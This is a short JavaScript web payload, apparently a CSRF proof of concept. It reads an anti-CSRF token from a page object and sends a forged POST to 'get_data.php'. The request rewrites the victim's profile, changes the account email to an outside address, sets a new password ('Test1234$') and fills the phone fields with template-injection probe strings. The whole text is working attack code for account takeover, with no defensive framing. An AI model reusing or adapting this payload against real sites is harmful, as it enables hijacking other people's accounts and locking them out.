http = new XMLHttpRequest();
url = 'get_data.php';
steal_token = Object.values(security)[0]
alert(steal_token)
params = 'token='+steal_token+'&accion=actualizaPerfil&nombre=CSRF&#95;NAME&apellido=CSRF&#95;DIRECTION&correo=tstaeg&#64;gmail&#46;com&direccion=newaddress&telefonoA=&#91;object&#32;Object&#93;&telefonoB=&#91;object&#32;Object&#93;&telefonoC=&#43;5791223313666&#91;&#93;&#91;&#93;&#123;&#125;&#123;7&#42;7&#125;&#92;&#92;n&#92;&#92;&amp;amp&#59;a&actualizaPass=true&passNuevo=Test1234&#36;';
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);
